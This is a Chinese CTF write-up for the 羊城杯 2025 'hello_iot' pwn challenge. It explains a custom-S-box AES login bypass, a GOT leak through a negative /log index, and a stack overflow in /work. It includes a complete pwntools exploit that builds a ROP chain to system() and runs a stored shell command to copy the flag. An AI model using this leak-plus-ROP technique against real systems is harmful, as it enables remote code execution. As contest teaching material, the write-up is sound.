---
title: 羊城杯 2025 初赛 - hello_iot
date: 2025/10/13 17:23:00
updated: 2025/10/20 22:08:00
tags:
    - httpd
    - ROP
    - hard to rev
thumbnail: /assets/ycb2025/rcon_sbox.png
excerpt: 通过自定义AES换S盒加密登录验证、利用`/log`泄露libc和指令地址、`/work`触发栈溢出实现RCE获取flag。
---

> 这个IoT站点的鉴权似乎比较严格

## 文件属性

|属性  |值    |
|------|------|
|Arch  |amd64 |
|RELRO|Partial|
|Canary|off   |
|NX    |on    |
|PIE   |off   |
|strip |yes   |
|libc  |2.31-0ubuntu9.18|

## 解题思路

看似IoT，实则并非。一个基于 *libmicrohttpd* 的amd64程序，进入`main`函数可以看到使用
*libmicrohttpd* 提供的函数注册HTTP请求处理回调函数，里面是主要逻辑。

如果用户没有登录，则只能访问`login.html`以及`login`接口，
通过验证后可以访问`log`和`work`接口。其中`work`接口能通过POST记录一些数据，
如果数据中存在`YCB2025`，则输入大量数据还可以触发栈溢出。
使用`log`接口则能使用`index`访问记录进去的数据，如果是负数，则能向低地址访问到GOT表，
从而泄露libc。

最难的反而是怎样登录。在`/login.html`中可以找到临时生成的`KEY`，接着在`login`接口中会做验证。
我们需要使用POST上传十六进制编码的`ciphertext`，经过处理后要和`KEY`相等。
看起来是某种加密算法，虽然经过编译后某些特征不太明显，但是还是能看出这个算法
**解密需要10轮，每块16字节，有rcon数组以及两个S盒**。

![rcon and sbox](/assets/ycb2025/rcon_sbox.png)

那么这个算法应该就是aes了。注意到虽然rcon数组和标准aes一致，但是S盒和逆S盒都和标准的不同。
不管怎么说，先让AI生成一个aes加密的算法，然后把里面的S盒换掉，放到gdb里解密试试，
实测没问题，那就可以继续了。

<img src="/assets/ycb2025/test_decrypt.png" width="70%">

接下来思路就很清晰了，先使用`/login.html`获取`KEY`，然后将`KEY`加密后用来登录`/login`，
再使用`/work`预存一条shell指令，接着使用`/log`接口泄露libc和预存指令的地址，
最后使用`/work`打栈溢出，调用`system`执行预存的指令。

由于起的方式是microhttpd，因此不能直接调用`system("/bin/sh")`，因为标准输入输出都没有连接到socket上。
使用重定向好像也不行，从头构造一个MHD请求也很麻烦。最后选择将文件写入到当前目录下（如`work.html`），
随后再发一条请求获取文件内容即可。

## EXPLOIT

```python aes.py
from pwn import u64
# ========================================================
#  纯 Python 实现 AES-128 加密 (支持自定义 S-box)
# ========================================================

# 默认 AES S-box，可自行修改实现「换表 AES」
S_BOX = [
    0x29, 0x40, 0x57, 0x6e, 0x85, 0x9c, 0xb3, 0xca, 0xe1, 0xf8,  0xf, 0x26, 0x3d, 0x54, 0x6b, 0x82,
    0x99, 0xb0, 0xc7, 0xde, 0xf5,  0xc, 0x23, 0x3a, 0x51, 0x68, 0x7f, 0x96, 0xad, 0xc4, 0xdb, 0xf2,
     0x9, 0x20, 0x37, 0x4e, 0x65, 0x7c, 0x93, 0xaa, 0xc1, 0xd8, 0xef,  0x6, 0x1d, 0x34, 0x4b, 0x62,
    0x79, 0x90, 0xa7, 0xbe, 0xd5, 0xec,  0x3, 0x1a, 0x31, 0x48, 0x5f, 0x76, 0x8d, 0xa4, 0xbb, 0xd2,
    0xe9,  0x0, 0x17, 0x2e, 0x45, 0x5c, 0x73, 0x8a, 0xa1, 0xb8, 0xcf, 0xe6, 0xfd, 0x14, 0x2b, 0x42,
    0x59, 0x70, 0x87, 0x9e, 0xb5, 0xcc, 0xe3, 0xfa, 0x11, 0x28, 0x3f, 0x56, 0x6d, 0x84, 0x9b, 0xb2,
    0xc9, 0xe0, 0xf7,  0xe, 0x25, 0x3c, 0x53, 0x6a, 0x81, 0x98, 0xaf, 0xc6, 0xdd, 0xf4,  0xb, 0x22,
    0x39, 0x50, 0x67, 0x7e, 0x95, 0xac, 0xc3, 0xda, 0xf1,  0x8, 0x1f, 0x36, 0x4d, 0x64, 0x7b, 0x92,
    0xa9, 0xc0, 0xd7, 0xee,  0x5, 0x1c, 0x33, 0x4a, 0x61, 0x78, 0x8f, 0xa6, 0xbd, 0xd4, 0xeb,  0x2,
    0x19, 0x30, 0x47, 0x5e, 0x75, 0x8c, 0xa3, 0xba, 0xd1, 0xe8, 0xff, 0x16, 0x2d, 0x44, 0x5b, 0x72,
    0x89, 0xa0, 0xb7, 0xce, 0xe5, 0xfc, 0x13, 0x2a, 0x41, 0x58, 0x6f, 0x86, 0x9d, 0xb4, 0xcb, 0xe2,
    0xf9, 0x10, 0x27, 0x3e, 0x55, 0x6c, 0x83, 0x9a, 0xb1, 0xc8, 0xdf, 0xf6,  0xd, 0x24, 0x3b, 0x52,
    0x69, 0x80, 0x97, 0xae, 0xc5, 0xdc, 0xf3,  0xa, 0x21, 0x38, 0x4f, 0x66, 0x7d, 0x94, 0xab, 0xc2,
    0xd9, 0xf0,  0x7, 0x1e, 0x35, 0x4c, 0x63, 0x7a, 0x91, 0xa8, 0xbf, 0xd6, 0xed,  0x4, 0x1b, 0x32,
    0x49, 0x60, 0x77, 0x8e, 0xa5, 0xbc, 0xd3, 0xea,  0x1, 0x18, 0x2f, 0x46, 0x5d, 0x74, 0x8b, 0xa2,
    0xb9, 0xd0, 0xe7, 0xfe, 0x15, 0x2c, 0x43, 0x5a, 0x71, 0x88, 0x9f, 0xb6, 0xcd, 0xe4, 0xfb, 0x12,
]

R_CON = [
    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36
]


def sub_bytes(state):
    return [S_BOX[b] for b in state]


def shift_rows(s):
    return [
        s[0], s[5], s[10], s[15],
        s[4], s[9], s[14], s[3],
        s[8], s[13], s[2], s[7],
        s[12], s[1], s[6], s[11]
    ]


def xtime(a):
    return ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else (a << 1)


def mix_single_column(a):
    t = a[0] ^ a[1] ^ a[2] ^ a[3]
    u = a[0]
    a[0] ^= t ^ xtime(a[0] ^ a[1])
    a[1] ^= t ^ xtime(a[1] ^ a[2])
    a[2] ^= t ^ xtime(a[2] ^ a[3])
    a[3] ^= t ^ xtime(a[3] ^ u)
    return a


def mix_columns(s):
    for i in range(4):
        col = s[i * 4:(i + 1) * 4]
        s[i * 4:(i + 1) * 4] = mix_single_column(col)
    return s


def add_round_key(s, k):
    return [a ^ b for a, b in zip(s, k)]


def key_expansion(key):
    key_symbols = list(key)
    assert len(key_symbols) == 16
    expanded = key_symbols[:]
    for i in range(4, 44):
        t = expanded[(i - 1) * 4:i * 4]
        if i % 4 == 0:
            t = t[1:] + t[:1]
            t = [S_BOX[b] for b in t]
            t[0] ^= R_CON[i // 4]
        for j in range(4):
            expanded.append(expanded[(i - 4) * 4 + j] ^ t[j])
    return expanded


def aes_encrypt_block(block, key):
    state = list(block)
    w = key_expansion(key)
    state = add_round_key(state, w[:16])
    for round in range(1, 10):
        state = sub_bytes(state)
        state = shift_rows(state)
        state = mix_columns(state)
        state = add_round_key(state, w[round * 16:(round + 1) * 16])
    state = sub_bytes(state)
    state = shift_rows(state)
    state = add_round_key(state, w[160:176])
    return bytes(state)


# ====== 示例 ======
if __name__ == "__main__":
    key = b"0123456789ABCDEF"
    plaintext = b"A" * 16
    ciphertext = aes_encrypt_block(plaintext, key)
    print("Plain :", plaintext)
    print("Cipher:", hex(u64(ciphertext[:8])), hex(u64(ciphertext[8:])))
```

```python
from pwn import *
from aes import aes_encrypt_block
import re
import sys
import requests

context.arch = 'amd64'
def GOLD_TEXT(x): return f'\x1b[33m{x}\x1b[0m'
IP = '45.40.247.139'
PORT = 25642
URL_BASE = f'http://{IP}:{PORT}'
LIBC = './libc-2.31.so'

# Get decrypted key
response = requests.get(f'{URL_BASE}/login.html')
match = re.search(r'<strong>([a-z]+)</strong>', response.text)
assert match
rand_key = match.group(1)
info(f'Retrieve random key: {rand_key}')

# Encrypt the key
cipher = aes_encrypt_block(rand_key.encode(), b'0123456789ABCDEF').hex()
info(f'Try this cipher: {cipher}')

# Login the system
response = requests.post(f'{URL_BASE}/login', data=f'ciphertext={cipher}')
assert response.status_code == 200

# Now test if the key is right and leak libc
response = requests.post(f'{URL_BASE}/log', data='index=-173')
if response.status_code == 401:
    warn('Unable to log in!')
    sys.exit(1)
assert response.status_code == 200
match = re.search(r'<pre>(0x[a-f0-9]+)</pre>', response.text)
assert match

libc = ELF(LIBC)
libc_base = int(match.group(1), 16) - libc.symbols['malloc']
success(GOLD_TEXT(f'Leak libc_base: {libc_base:#x}'))
libc.address = libc_base

if len(sys.argv) > 1 and sys.argv[1] == 'next':
    # next stage: print flag in work.html
    response = requests.get(f'{URL_BASE}/work.html')
    assert 'DASCTF' in response.text
    success(f'Flag is: {response.text}')
    sys.exit(0)

# Before attack, draft a RCE command first
cmd = 'cat /flag > work.html;'
response = requests.post(f'{URL_BASE}/work', data=f'data={cmd}\r\n')
match = re.search(r'Total=(\d+)', response.text)
assert match
slot = int(match.group(1)) - 1
info(f'Hijack httpd to run {cmd} at slot {slot}')

# Then fetch its address
response = requests.post(f'{URL_BASE}/log', data=f'index={slot}')
match = re.search(r'0x[a-f0-9]+', response.text)
assert match
rce = int(match.group(0), 16)
success(GOLD_TEXT(f'Found RCE command on {rce:#x}'))

# Construct a payload to perform ROP
gadgets = ROP(libc)
chain = flat(gadgets.rdi.address, rce,
             gadgets.ret.address, # balance stack
             libc.symbols['system'],
             gadgets.rdi.address, 0,
             libc.symbols['exit'])

# Finally trigger the ROP
t = remote(IP, PORT)
payload = b'data=' + pack(0, 0x48 * 8) + chain + b'YCB2025\n\n'
body = f'''POST /work HTTP/1.0\r
Host: {IP}:{PORT}\r
Content-Length: {len(payload)}\r
\r
'''.encode()
t.send(body + payload)
t.close()
```

{% note default fa-flag %}
![flag](/assets/ycb2025/iot_flag.png)
{% endnote %}
